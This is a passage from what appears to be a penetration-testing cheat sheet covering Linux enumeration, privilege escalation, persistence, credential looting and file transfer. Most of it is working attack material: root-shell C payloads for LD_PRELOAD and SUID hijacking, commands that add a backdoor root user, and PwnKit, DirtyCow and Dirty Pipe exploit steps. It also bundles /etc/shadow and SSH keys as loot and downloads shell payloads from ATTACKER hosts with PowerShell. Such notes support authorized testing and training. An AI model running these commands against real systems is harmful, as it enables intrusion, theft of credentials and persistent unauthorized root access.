# /groups are the desired group RIDs (512 being Domain Admins).
# /krbkey is the krbtgt AES256 hash. 
```


# 6 Linux

## 6.1 Basic Linux Post-Exploit Enumeration

Before you run basic enumeration, [upgrade to an interactive shell](#4.4.3%20Upgrading%20to%20Interactive%20Shell)

```sh
# minimum commands
id
uname -a
cat /etc/*release
env                # or 'set'
ps -ef wwf
ip a               # or ifconfig -a
ss -untap          # or 'netstat -untap'
w
last


###############################
## SELF  ######################
###############################

# current user
id
whoami

# check sudo permissions
sudo -l
# take advantage of every permission you have!

# environment
(env || set) 2>/dev/null


###############################
## HOST  ######################
###############################

# hostname
hostname
hostname -A  # Linux - also shows all FQDNs
hostname -f  # BSD,Mac - show FQDN
cat /etc/hostname

# OS Version info
(cat /proc/version || uname -a ) 2>/dev/null
cat /etc/*release
cat /etc/issue
# look for kernel version exploits


###############################
## USERS  #####################
###############################

# list all users, groups
cat /etc/passwd
cat /etc/group
grep -vE "nologin|false" /etc/passwd
cat /etc/master.passwd
cat /etc/shadow  # need to be root, get list of hashed passwords
# pretty print relevant data
grep -v '#' /etc/passwd | awk -F: 'BEGIN{print "USERNAME PASSWD UID GID HOMEDIR SHELL"; print "-------- ------ --- --- ------- -----"} {print $1 " " $2 " " $3 " " $4 " " $6 " " $7}' | column -t

# Currently signed in users
w
who -a

# Recently signed in users
last  # better info running as root, may need "-a" switch


###############################
## NETWORK  ###################
###############################

# IP addresses, interfaces
ip a
ifconfig -a
cat /etc/network/interfaces
# check that you're on the box you expect
# look for pivots into other networks
# look for signs of virtualization, containers, antivirus

# Routing info
ip r
route -n
routel
netstat -r

# arp table
ip n
arp -a

# Network connections
# when commands run as root, get process info for all users
# when run as user, only see owned process information
ss -untap # Linux, all tcp/udp ports w/ pids
netstat -untap  # Old linux, all tcp/udp ports w/ pids
netstat -nvf inet # Mac
lsof -Pni  # established connections
fuser -n tcp PORTNUM # who is using port?
# advanced, as root: data under /proc/net/

# known hosts
cat /etc/hosts

# iptables rules
cat /etc/iptables/rules.v4 # Debian,Ubuntu
cat /etc/sysconfig/iptables # RHEL,CentOS,Fedora
cat /etc/iptables/rules.v6 # Debian,Ubuntu
cat /etc/sysconfig/ip6tables # RHEL,CentOS,Fedora
# must be root to run 'iptables'
iptables -L -v -n
iptables -t nat -L -v -n  # NAT info
iptables-save  # saved iptables

# DNS resolver info
cat /etc/resolv.conf

# if you have sudo permissions for tcpdump,
# privesc with it (it's a GTFOBin).
# Also, sniff for plaintext creds:
sudo tcpdump -i lo -A | grep -i "pass"


###############################
## PROCESSES  #################
###############################

# running processes
ps -ef wwf
# look for unusual processes
# or processes running as root that shouldn't be

# view all cron scripts
ls -lah /etc/cron*
# look at system-wide crontab
cat /etc/crontab
# pay attention to PATH in /etc/crontab and any bad file perms of scripts

# check this user's cron jobs
crontab -l

# check for running cron jobs
grep "CRON" /var/log/syslog
grep "CRON" /var/log/cron.log

# list every user's cron jobs
for user in $(cut -f1 -d: /etc/passwd); do crontab -u $user -l; done 2>/dev/null


###############################
## FILESYSTEM  ################
###############################

# mounted filesystems
mount
cat /etc/fstab
cat /etc/auto?master
df -h # disk stats
lsblk # available disks
# unmounted partitions may have juicy files on them
# look for credentials in /etc/fstab or /etc/auto*

# find all SUID and SGID binaries
find / -type f \( -perm -u+s -o -perm -g+s \) -executable -ls 2> /dev/null
find / -type f \( -perm -u+s -o -perm -g+s \) -perm -o+x -ls 2> /dev/null

# list writable directories in PATH
# bash, sh:
( set -o noglob; IFS=:;for p in $PATH; do [ -w "$p" ] && ls -ald $p; done )
# zsh:
( set -o noglob; IFS=:; for p in ($(echo $PATH)); do [ -w "$p" ] && ls -ald $p; done )

# find world-writable files and directories
find / \( -path /sys -o -path /proc -o -path /dev \) -prune -o -perm -o+w -type d -ls 2>/dev/null
find / \( -path /sys -o -path /proc -o -path /dev \) -prune -o -perm -o+w -type f -ls 2>/dev/null
# to limit search to current file system mount, use -mount or -xdev

# find directories/files _this user_ can write to, not owned by me
find / \( -path /sys -o -path /proc \) -prune -o -writable -type d -not -user "$(whoami)" -ls 2>/dev/null
find / \( -path /sys -o -path /proc \) -prune -o -perm -o+w -type d -not -user "$(whoami)" -ls 2>/dev/null
find / \( -path /sys -o -path /proc \) -prune -o -writable -type f -not -user "$(whoami)" -ls 2>/dev/null

# check Capabilities of files
# look for GTFOBins that have cap_setuid+ep (effective, permitted)
/usr/sbin/getcap -r / 2>/dev/null | grep cap_setuid

# shell history
cat /home/*/.*history
grep -E 'telnet|ssh|mysql' /home/*/.*history 2>/dev/null

# credential files
ls -l /home/*/.ssh/id_*  # ssh keys
ls -AlR /home/*/.gnupg  # PGP keys
ls -l /tmp/krb5*  # Kerberos tickets
find / -type f -name *.gpg
find / -type f -name id_*



###############################
## SOFTWARE  ##################
###############################

# Info on installed packages
dpkg -l  # Debian
rpm -qa --last  # RedHat
yum list | grep installed  # CentOS/RedHat w/ Yum
apt list --installed  # Debain w/ Apt
pkg_info  # xBSD
pkginfo  # Solaris
ls -d /var/db/pkg/  # Gentoo
pacman -Q  # Arch
cat /etc/apt/sources.list  # Apt sources
ls -l /etc/yum.repos.d/  # Yum repos
cat /etc/yum.conf  # Yum config

# Kernel modules
lsmod # list loaded modules
/sbin/modinfo MODULENAME # get info on module

# check version info of useful binaries
gcc -v  # compiler
ldd --version  # glibc version
python --version
python3 --version
perl -v
php -v
ruby -v
node -v
mysql --version

# See if other useful GTFO-bins are present
which awk base64 curl dd gdb gzip less lua nano nmap nohup openssl rsync scp ssh screen sed socat tar tmux vi vim wget xxd xz zip


##################################
## VULNERABILITIES  ##############
##################################

# check for CVE-2021-3156 (sudoedit heap-based buffer overflow, privesc)
# *check only works if you are in sudoers file. Affects all legacy versions
# from 1.8.2 to 1.8.31p2 and all stable versions from 1.9.0 to 1.9.5p1.
# Exploit works even if user isn't in sudoers file.
sudoedit -s /
# Vulnerable if it says 'sudoedit: /: not a regular file' instead of 'usage:...'
# use exploit: https://github.com/CptGibbon/CVE-2021-3156.git

# check sudo version
sudo -V
# if older than 1.8.28, root privesc:
sudo -u#-1 /bin/bash
# or sudo -u \#$((0xffffffff)) /bin/bash


# check for pwnkit (look for version < 0.120)
/usr/bin/pkexec --version


####################################
## MISCELLANEOUS  ##################
####################################

# kernel system messages since boot
dmesg

# processor and memory info
cat /proc/cpuinfo
cat /proc/meminfo

# Message of the Day
cat /etc/motd

# Get SELinux status
getenforce
```

### 6.1.1 Watching for Linux Process Changes

```sh
#!/bin/bash
# source: Ippsec nineveh walkthrough

# Loop by line
IFS=$'\n'

old_process=$(ps aux --forest | grep -v "ps aux --forest" | grep -v "sleep 1" | grep -v $0)

while true; do
  new_process=$(ps aux --forest | grep -v "ps aux --forest" | grep -v "sleep 1" | grep -v $0)
  diff <(echo "$old_process") <(echo "$new_process") | grep [\<\>]
  sleep 1
  old_process=$new_process
done
```

Also check out [pspy](https://github.com/DominicBreuker/pspy)


## 6.2 Linux Privilege Escalation

So many options:
- [PayloadsAllTheThings - Linux Privesc](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md)
- [HackTricks - Linux Privesc](https://book.hacktricks.xyz/linux-hardening/privilege-escalation)


### 6.2.1 Abusing `sudo`

[Many binaries](https://gtfobins.github.io/#+sudo) let you run commands from within them. If you get limited `sudo`
permissions for one of the binaries, you can escalate to root.

> ⚠ **NOTE**: If you get "Permission denied" error, check `/var/log/syslog` to see if the `audit` daemon is blocking you with `AppArmor` (enabled by default on Debian 10).

```sh
# check for sudo permissions
sudo -l
# if you see a binary with '(root) NOPASSWD ...' you might be in luck
# check the following website for escalation methods:
# https://gtfobins.github.io/#+sudo

# Example: awk
sudo awk 'BEGIN {system("/bin/sh")}'

# Example: find
sudo find . -exec /bin/sh \; -quit
```

### 6.2.2 Adding root user to /etc/shadow or /etc/passwd

```sh
# if /etc/shadow is writable
# generate new password
openssl passwd -6 herpderp
# or
mkpasswd -m sha-512 herpderp
# edit /etc/shadow and overwrite hash of root with this one

# if /etc/passwd is writable
echo "derp:$(openssl passwd -6 herpderp):0:0:root:/root:/bin/bash" >> /etc/passwd
# alternatively
echo "derp:$(mkpasswd -m sha-512 herpderp):0:0:root:/root:/bin/bash" >> /etc/passwd
# pre-computed for password 'herpderp':
echo 'derp:$5$herpderp$pkbOJ3TJ8UP4oCW0.B5bzt3vNeHCXClgwE2efw60p.6:0:0:root:/root:/bin/bash' >> /etc/passwd

# the empty/blank crypt hash for old Linux systems is U6aMy0wojraho.
# if you see this in an /etc/passwd (or shadow), the user has no password!

# can also add generated password between the first and second colon of root user
```

### 6.2.3 Grant passwordless sudo access

Edit the `/etc/sudoers` file to have the following line:

```
myuser ALL=(ALL) NOPASSWD: ALL
```

### 6.2.4 LD_PRELOAD and LD_LIBRARY_PATH

For this to work, `sudo -l` must show that either LD_PRELOAD or LD_LIBRARY_PATH
are inherited from the user's environment:
```
env_keep+=LD_PRELOAD, env_keep+=LD_LIBRARY_PATH
```

`preload.c`:
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#define _GNU_SOURCE
#include <unistd.h>

void _init() {
	unsetenv("LD_PRELOAD");
	// setresuid(0,0,0);
  setuid(0);
  setgid(0);
	system("/bin/bash -p");
  exit(0);
}
```

`library_path.c`:
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
	unsetenv("LD_LIBRARY_PATH");
	setresuid(0,0,0);
	system("/bin/bash -p");
  exit(0);
}
```

Usage:

```sh
# LD_PRELOAD
# compile malicious preload binary
gcc -fPIC -shared -nostartfiles -o /tmp/preload.so preload.c
# use it to get root
sudo LD_PRELOAD=/tmp/preload.so program_name_here

# LD_LIBRARY_PATH
# see which shared libraries are used
ldd $(which apache2)
# compile malicious library as one of existing ones
gcc -o /tmp/libcrypt.so.1 -shared -fPIC library_path.c
# use it to get root
sudo LD_LIBRARY_PATH=/tmp apache2
# note, some ld-files work better than others, so try every option from ldd
# if the first attempt fails. May also need to alter file to hook function
# being called (must exactly match function signature)
```

### 6.2.5 Hijacking SUID binaries

`inject.c`:
```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

static void inject() __attribute__((constructor));

void inject() {
	setuid(0);
  setgid(0);
	system("/bin/bash -p");
  exit(0);
}
```

```sh
# find all root-owned SUID and GUID binaries
find / -type f \( -perm -g+s -a -gid 0 \) -o \( -perm -u+s -a -uid 0 \) -ls 2>/dev/null

# look for access to shared object that doesn't exist, but we might control
strace /usr/local/bin/suid-so 2>&1 | grep -iE "open|access|no such file"

# compile your inject file
gcc -shared -fPIC inject.c -o /path/to/hijacked.so

# run your binary
suid-so
```

You can also hijack system(3) calls in an executable where the binary path isn't
specified (PATH hijack). Look for clues using `strings` and `strace`, then replace
the binary in question with your own:

`hijack.c`
```c
/* Gets root shell
 * Compile (as root):
 * gcc -Wall pwn.c -o pwn && chmod u+s pwn
 */
#define _GNU_SOURCE
#include <stdlib.h>
#include <unistd.h>

int main() {
	setuid(0);
	setgid(0);
	system("/bin/bash -p");
  return 0;
}
```

And invoke like so:
```sh
# compile
gcc hijack.c -o hijacked-binary-name

# inject onto PATH
PATH=.:$PATH victim-binary
```

In `bash` versions less than 4.2-048, you can even do PATH hijacks by exporting
functions that look like valid paths, and will get executed instead of the
binary at the real path:

```sh
# create a substitute for /usr/sbin/service
function /usr/sbin/service { /bin/bash -p; }
export -f /usr/sbin/service
# then just run victim binary that executes /usr/sbin/service
```

For bash versions less than 4.4, you can also take advantage of the PS4 env var,
which is used to display debug information (debug mode when `SHELLOPTS=xtrace`).

```sh
env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)' /usr/local/bin/suid-env2
```

### 6.2.6 Using NFS for Privilege Escalation

NFS Shares inherit the **remote** user ID, so if root-squashing is disabled,
something owned by root remotely is owned by root locally.

```sh
# check for NFS with root-squashing disabled (no_root_squash)
cat /etc/exports

# On Kali box:
sudo su   # switch to root
mkdir /tmp/nfs
mount -o rw,nolock,vers=2 $VICTIM_IP:/share_name /tmp/nfs
# Note: if mount fails, try without vers=2 option.
msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/shell.elf
chmod +xs /tmp/nfs/shell.elf

# on victim machine
/tmp/shell.elf
```

### 6.2.7 Using Docker for Privesc

This is possible when the user is a member of the `docker` group.

```sh
# mounts the root filesystem into the docker container, and
# starts an interactive docker shell
docker run --rm -it -v /:/mnt --privileged ubuntu bash
```

From there, add your ssh key to `/mnt/root/.ssh/authorized_keys` or update the
`/mnt/etc/passwd` file to include an additional malicious root user.

### 6.2.8 Linux Kernel Exploits

⚠ **NOTE**: Use LinPEAS to enumerate for kernel vulnerabilities. Searchsploit is often less effective.

#### 6.2.8.1 Dirty Cow

[CVE-2016-5195](https://cve.mitre.org/cgi-bin/cvename.cgi?name=2016-5195) is effective against Linux kernels 2.x through 4.x before 4.8.3.

```sh
# easiest if g++ avail
searchsploit -m 40847
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
./dcow -s

# Also good:
searchsploit -m 40839

# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
```


#### 6.2.8.2 PwnKit

[CVE-2021-4034](https://nvd.nist.gov/vuln/detail/cve-2021-4034) PwnKit is effective against many Linux variants:
- Ubuntu 10 - Ubuntu 21.10
- Debian 7 - Debian 11
- RedHat 6.0 - RedHat 8.4 (and similar Fedora & CentOS versions?)

Affects pkexec (polkit) < 0.120.

**Detailed vulnerable versions:**  [reference](https://www.datadoghq.com/blog/pwnkit-vulnerability-overview-and-remediation/)

Check what's installed with `dpkg -s policykit-1`

Ubuntu:

| Ubuntu version     | Latest vulnerable version | First fixed version         |
| ------------------ | ------------------------- | --------------------------- |
| 14.04 LTS (Trusty) | 0.105-4ubuntu3.14.04.6    | 0.105-4ubuntu3.14.04.6+esm1 |
| 16.04 LTS (Xenial) | 0.105-14.1ubuntu0.5       | 0.105-14.1ubuntu0.5+esm1    |
| 18.04 LTS (Bionic) | 0.105-20                  | 0.105-20ubuntu0.18.04.6     |
| 20.04 LTS (Focal)  | 0.105-26ubuntu1.1         | 0.105-26ubuntu1.2           |

Debian:

| Debian version | Latest vulnerable version | First fixed version |
| -------------- | ------------------------- | ------------------- |
| Stretch        | 0.105-18+deb9u1           | 0.105-18+deb9u2     |
| Buster         | 0.105-25                  | 0.105-25+deb10u1    |
| Bullseye       | 0.105-31                  | 0.105-31+deb11u1    |
| (unstable)     | 0.105-31.1~deb12u1        | 0.105-31.1          |

Checking for vulnerability:

```sh
# check suid bit set:
ls -l /usr/bin/pkexec

# check for vulnerable version (see above tables):
dpkg -s policykit-1
```

Exploit:

```sh
curl -fsSL https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit -o pwnkit
chmod +x ./pwnkit
./pwnkit # interactive shell
./pwnkit 'id' # single command
# it will tell you nicely if the exploit fails when the system is patched.
```


#### 6.2.8.3 Get-Rekt BPF Sign Extension LPE

[CVE-2017-16995](https://nvd.nist.gov/vuln/detail/CVE-2017-16995) is effective against Linux kernel 4.4.0 - 4.14.10.
- Debian 9
- Ubuntu 14.04 - 16.04
- Mint 17 - 18
- Fedora 25 - 27

```sh
# on kali, grab source
searchsploit -m 45010
python -m http.server 80

# on victim, download, compile, and execute
wget LISTEN_IP/45010.c -O cve-2017-16995
gcc cve-2017-16995.c -o cve-2017-16995
```


#### 6.2.8.4 Dirty Pipe

[CVE-2022-0847](https://nvd.nist.gov/vuln/detail/CVE-2022-0847) affects Linux kernels 5.8.x up. The vulnerability was fixed in Linux 5.16.11, 5.15.25 and 5.10.102.
- Ubuntu 20.04 - 21.04
- Debian 11
- RHEL 8.0 - 8.4
- Fedora 35

```sh
wget https://raw.githubusercontent.com/Arinerron/CVE-2022-0847-DirtyPipe-Exploit/main/exploit.c
python -m http.server 80

# on victim
wget LISTEN_IP/exploit.c
gcc exploit.c -o exploit # may need to compile locally with "-static"
./exploit # if statically compiled, may complain about system() failing, but might be ok

# check if exploit worked
grep root /etc/passwd # should see hash with 'aaron' salt

# become r00t
su - # use password 'aaron'

# to restore to pre-exploit state
# if you get error "su: must be run from a terminal"
# or error "system() function call seems to have failed :("
# but the exploit successfully changed root's password in /etc/passwd
# - login as root with the password aaron.
# - restore /etc/passwd
mv /tmp/passwd.bak /etc/passwd
```



## 6.3 Linux Persistence

Many of the techniques for privilege escalation can be used to also maintain persistence (particularly ones where you modify a file).

### 6.3.1 Add SSH key to authorized_keys

You can add your key to either `root` or a user with (passwordless) sudo.

```sh
# on kali, make ssh key and copy it
ssh-keygen -C "derp" -N "" -f ./derp-ssh
xclip -sel clip derp-ssh.pub

# on victim (as root):
# make sure .ssh directory exists with right permissions
mkdir -pm700 /root/.ssh
# add key to authorized_keys
echo "PASTEYOURSSHPUBKEY" >> /root/.ssh/authorized_keys
```

### 6.3.2 Set SUID bit

If you set the SUID bit of a root-owned executable, like `/bin/sh` or `less`
or `find` (see [GTFOBins](https://gtfobins.github.io/#+shell) for more), you can use those to give yourself a root shell. This is a kind of privesc backdoor.

```sh
sudo chmod u+s /bin/sh
```


## 6.4 Miscellaneous Linux Commands

```sh
# make sure terminal environment is good, if not working right
export PATH='/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin'
export TERM=xterm-256color
```


### 6.4.1 Awk & Sed

Sometimes there is a lot of extra garbage in the loot you grab. It's nice to
be able to quickly sift through it to get the parts you care about.

```sh
# grab lines of text between start and end delimiters.
awk '/PAT1/,/PAT2/' # includes start and end lines
awk '/PAT1/{flag=1; next} /PAT2/{flag=0} flag' FILE  # omits delims
sed -n '/PAT1/,/PAT2/{//!p;}' FILE
sed '/PAT1/,/PAT2/!d;//d' FILE
```

## 6.5 Linux Files of Interest

```sh
# quick command to grab the goods
tar zcf loot.tar.gz \
/etc/passwd{,-} \
/etc/shadow{,-} \
/etc/ssh/ssh_config \
/etc/ssh/sshd_config \
/home/*/.ssh/id_* \
/home/*/.ssh/authorized_keys* \
/home/*/.gnupg \
/root/.gnupg \
/root/.ssh/id_* \
/root/.ssh/authorized_keys* \
/root/network-secret*.txt \
/root/proof.txt
```

# 7 Loot

## 7.1 Sensitive Files

The following are some files that have sensitive information that
are good to try to grab when you can (directory traversal, LFI, shell access).


### 7.1.1 Sensitive Files on Linux

Also check out [Linux Files of Interest](#6.5%20Linux%20Files%20of%20Interest).

```sh
/etc/passwd

# "shadow" files usually have credentials
find / -path '/usr' -prune -o -type f -readable \( -iname 'shadow*' -o -iname '.shadow*' \) -ls 2>/dev/null

# find ssh private keys (id_rsa, id_dsa, id_ecdsa, and id_ed25519)
find / -xdev -type f -readable -name 'id_*' -exec grep -q BEGIN {} \; -ls 2>/dev/null

# Wordpress config, can have credentials
find / -type f -readable -name wp-config.php -ls 2>/dev/null
# normally at:
/var/www/wordpress/wp-config.php

# look for other php config files that may have creds
find / -type f -readable -name '*config.php' -ls 2>/dev/null

# Apache htaccess files might indicate files/directories with sensitive info
find / -type f -readable -name .htaccess -ls 2>/dev/null

# mysql configs, can have creds
find / -type f -readable -name '*my.cnf' -ls 2>/dev/null

# find *_history files (bash, zsh, mysql, etc.), which may have sensitive info
find / -xdev -type f -readable -name '*_history' -ls 2>/dev/null

# AWS credentials
find / -xdev -type f -readable -path '*/.aws/*' \( -name credentials -o -name config \) -ls 2>/dev/null

# Docker config, has credentials
find / -xdev -type f -readable -path '*/.docker/*' -name config.json -ls 2>/dev/null

# GNUPG directory
find / -xdev -type d -readable -name '.gnupg' -ls 2>/dev/null

# Confluence config has credentials
find / -xdev -type f -readable -name confluence.cfg.xml -ls 2>/dev/null
# normally at:
/var/atlassian/application-data/confluence/confluence.cfg.xml

# VNC passwd files have creds
find / -xdev -type f -path '*/.*vnc/*' -name passwd -ls 2>/dev/null

# rarely, .profile files have sensitive info
find / -xdev -type f -readable -name '.*profile' -ls 2>/dev/null
```


### 7.1.2 Sensitive Files on Windows

Also check out:
- [Windows Passwords & Hashes](#5.8%20Windows%20Passwords%20&%20Hashes)
- [Windows Files of Interest](#5.11%20Windows%20Files%20of%20Interest)

```powershell
# SAM
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM

# Unattend install files: plaintext or base64 encoded password
C:\unattend.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\system32\sysprep.inf
C:\Windows\system32\sysprep\sysprep.xml

# IIS, web.config can contain admin creds
C:\inetpub\wwwroot\web.config
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config

# Groups.xml: encrypted password, but key is available online in many tools
C:\ProgramData\Microsoft\Group Policy\History\????\Machine\Preferences\Groups\Groups.xml
\\????\SYSVOL\\Policies\????\MACHINE\Preferences\Groups\Groups.xml

# The 'cpassword' attribute found in many files
Services\Services.xml
ScheduledTasks\ScheduledTasks.xml
Printers\Printers.xml
Drives\Drives.xml
DataSources\DataSources.xml

# Windows Autologin credentials
reg query HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon

# SNMP credentials
reg query HKLM\SYSTEM\Current\ControlSet\Services\SNMP

# McAfee password stored in SiteList.xml
%AllUsersProfile%\Application Data\McAfee\Common Framework\SiteList.xml

# Putty proxy creds
reg query HKCU\Software\SimonTatham\PuTTY\Sessions

# UltraVNC encrypted password
dir /b /s *vnc.ini
C:\Program Files\UltraVNC\ultravnc.ini
# decrypt with:
# echo -n ULTRAVNC_PW_HASH | xxd -r -p | openssl enc -des-cbc --nopad --nosalt -K e84ad660c4721ae0 -iv 0000000000000000 -d | hexdump -Cv
# or:
# https://github.com/trinitronx/vncpasswd.py
# or:
# msfconsole
# > irb
# > fixedkey = "\x17\x52\x6b\x06\x23\x4e\x58\x07"
# > require 'rex/proto/rfb'
# > Rex::Proto::RFB::Cipher.decrypt ["YOUR ENCRYPTED VNC PASSWORD HERE"].pack('H*'), fixedkey

# RealVNC hashed password in registry:
reg query HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4 /v password
reg query HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\vncserver /v password

# TightVNC
reg query HKEY_CURRENT_USER\Software\TightVNC\Server /s
reg query HKLM\SOFTWARE\TightVNC\Server\ControlPassword /s
tightvnc.ini
vnc_viewer.ini

# TigerVNC
reg query HKEY_LOCAL_USER\Software\TigerVNC\WinVNC4 /v password

# Search registry for password
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
```

More Windows IIS log and config paths [here](https://techcommunity.microsoft.com/t5/iis-support-blog/collect-basics-configuration-and-logs-when-troubleshooting-iis/ba-p/830927).



### 7.1.3 Sensitive Files - Generic

```powershell
*.kdbx # KeePass database
Get-ChildItem -Path C:\ -File -Recurse -ErrorAction SilentlyContinue -Include *.kdbx
```

#### 7.1.3.1 git repos

Sometimes git repos contain sensitive info in the git history.

```sh
# view commit history
git log

# show changes for a commit
git show COMMIT_HASH

# search for sensitive keywords in current checkout
git grep -i password

# search for sensitive keywords in file content of entire commit history
git grep -i password $(git rev-list --all)
```



## 7.2 File Transfers

**Great resource**: [HackTricks - Exfiltration](https://book.hacktricks.xyz/generic-methodologies-and-resources/exfiltration) 🎉 🎉 🎉

### 7.2.1 Netcat transfer

```sh
# start listening for download on port 9001
nc -nlvp 9001 > dump.txt
# upload file to IP via port 9001
nc $IP 9001 < file.txt
```

### 7.2.2 Curl transfers

```sh
# upload a file with curl (POST multipart/form-data)
# replace key1, upload with appropriate form fields
curl -v -F key1=value1 -F upload=@localfilename URL
```

### 7.2.3 PHP File Uploads

Uploading files via HTTP POST to `upload.php`:

```php
<?php
// File: upload.php
// start php server from same directory as this file:
// mkdir -p ../uploads && sudo php -S 0.0.0.0:80
  $parentdir = dirname(dirname(__FILE__));
  $uploaddir = $parentdir . '/uploads/';
  $filename = basename($_FILES['file']['name']);
  $uploadfile = $uploaddir . $filename;
  move_uploaded_file($_FILES['file']['tmp_name'], $uploadfile)
?>
```

You could also make Apache run it instead of standing up your own php server.
Change the `$uploaddir` variable above to `'/var/www/uploads'`, and put the
`upload.php` script in `/var/www/cgi-bin`. Requests will then point to
`/cgi-bin/upload.php` instead of just `/upload.php`.

Starting Apache server on Kali with necessary directories:

```bash
# make upload directory
sudo mkdir -p /var/www/uploads
sudo chown -R www-data:www-data /var/www/uploads
# start server
sudo systemctl restart apache2
```

Uploading files from Windows using PowerShell:

```powershell
(New-Object System.Net.WebClient).UploadFile('http://LISTEN_IP/upload.php','somefiile')
```

Uploading files from Linux using curl:

```sh
curl -v http://LISTEN_IP/upload.php -F "file=@somefile"
```

If large files fail to upload properly, change the `php.ini` or `.user.ini` settings:

```sh
# on kali, find and edit file
locate php.ini
sudo vim /etc/php/7.4/apache2/php.ini
# in php.ini, change the following:
[php]
# disable php memory limit
memory_limit = -1
# make it 10GiB
upload_max_filesize = 10G
# make it unlimited
post_max_size = 0
# allow uploads to take 2 minutes
max_execution_time = 120
```

**Note:** The `.user.ini` file goes in your site’s document root.

### 7.2.4 PowerShell File Transfers

```powershell
# Download to Windows victim
invoke-webrequest -uri http://ATTACKER/rsh.exe -out c:\users\public\rsh.exe
# For PowerShell version < 3.0
(net.webclient).downloadstring("http://ATTACKER/shell.ps1") > c:\users\public\shell.ps1
(net.webclient).downloadfile("http://ATTACKER/shell.ps1", "c:\users\public\shell.ps1")

# uploading a file:
(New-Object System.Net.WebClient).UploadFile('http://LISTEN_IP/upload.php','somefiile')
```

### 7.2.5 Mount NFS Share

```sh
# try without vers=3 if mount fails. Also try with vers=2
mount -t nfs -o vers=3 REMOTE_IP:/home/ /mnt/nfs-share
```

### 7.2.6 SMB Share

Sharing entire `C:/` drive as SMB share for malicious user:
```bat
net share Cderp$=C:\ /grant:derp,FULL /unlimited
```

Mounting/hosting share on Kali
```sh
# mount foreign SMB share on Kali
sudo mount -t cifs -o vers=1.0 //REMOTE_IP/'Sharename' /mnt/smbshare

# host SMB share on kali (note: 'share' is share name)
sudo impacket-smbserver -smb2support share .
# to use for exfil: copy C:\Windows\Repair\SAM \\KALI_IP\share\sam.save

# To work with Windows 10+
impacket-smbserver -smb2support -user derp -password herpderp share .
# to connect on Windows with creds:
# net use \\ATTACKER_IP herpderp /user:derp
```

Using curl to upload file to windows SMB share
```sh
curl --upload-file /path/to/rsh.exe -u 'DOMAIN\username' smb://$VICTIM_IP/c$/
```

Get all files from SMB share with `smbclient`:
```sh
smbclient //$VICTIM_IP/SHARENAME
> RECURSE ON
> PROMPT OFF
> mget *
```

### 7.2.7 FTP Server on Kali

```sh
# install pyftpdlib for root to use port 21
sudo pip install pyftpdlib
# get usage help
python3 -m pyftpdlib --help
# start server on port 21, allowing anonymous write
sudo python3 -m pyftpdlib -p 21 -w
# start server on port 2121 for specific username/password
python3 -m pyftpdlib -w -u derp -P herpderp
```

Then on Windows box, create `ftpup.bat`:
```bat
@echo off
:: change server IP and Port as required
echo open LISTEN_IP 2121> ftpcmd.dat
echo user derp>> ftpcmd.dat
echo herpderp>> ftpcmd.dat
echo bin>> ftpcmd.dat
echo put %1>> ftpcmd.dat
echo quit>> ftpcmd.dat
ftp -n -s:ftpcmd.dat
del ftpcmd.dat
```

And use like so:

```bat
ftpup.bat filetotxfer.txt
```

Node.js ftps-server:
```sh
sudo npm install -g ftp-srv --save
ftp-srv ftp://0.0.0.0:2121 --root /tmp
```

Pure-FTP server:
```sh
# Install
sudo apt update && sudo apt install -y pure-ftp
# Configure pure-ftp
groupadd ftpgroup
useradd -g ftpgroup -d /dev/null -s /usr/sbin/nologin ftpuser
pure-pwd useradd fusr -u ftpuser -d /ftphome
pure-pw mkdb
cd /etc/pure-ftpd/auth/
ln -s ../conf/PureDB 60pdb
mkdir -p /ftphome
chown -R ftpuser:ftpgroup /ftphome/
/etc/init.d/pure-ftpd restart
```



### 7.2.8 WebDAV

We can host a WebDAV server on our Kali box for pushing/pulling files from other hosts, especially Windows machines using a Library file pointing to the WebDAV share.

```sh
# install wsgidav (WebDAV server)
pip3 install --user wsgidav

# make a folder that we want to host publicly
mkdir webdav

# start the server with open access
wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root webdav/
# you can confirm this is running by going to http://127.0.0.1 in your browser
```



### 7.2.9 SSHFS

To make things easier, set up a config file like so:

```
Host alpha
    HostName REMOTE_IP
    User root
    StrictHostKeyChecking no
    UserKnownHostsFile /dev/null
    IdentityFile /full/path/to/root_rsa
```

Then mount the filesystem with root access:

```sh
# format: sshfs [user@]host:[remote_directory] mountpoint [options]
sshfs -F/full/path/to/ssh-config alpha:/ ./rootfs
```

### 7.2.10 Windows LOLBAS File Downloads

```powershell
# Download 7zip binary to ./7zip.exe, using urlcache or verifyctl
certutil -urlcache -split -f http://7-zip.org/a/7z1604-x64.exe 7zip.exe
certutil -verifyctl -f -split http://7-zip.org/a/7z1604-x64.exe 7zip.exe

# Download using expand
expand http://7-zip.org/a/7z1604-x64.exe 7zip.exe
# Download from SBM share into Alternate Data Stream
expand \\badguy\evil.exe C:\Users\Public\somefile.txt:evil_ads.exe

# Download using powershell
powershell -c "(new-object System.Net.WebClient).DownloadFile('http://7-zip.org/a/7z1604-x64.exe','7zip.exe')"
powershell iwr -uri http://7-zip.org/a/7z1604-x64.exe -outfile 7zip.exe
```

# 8 Pivoting and Redirection

These are techniques for "traffic bending" or "traffic shaping" or
"tunneling traffic" or "port redirection" or "port forwarding".

## 8.1 SSH Tunnels

Before starting, it is best to have the following settings enabled in the jumpbox
`/etc/ssh/sshd_config` file.

```ini
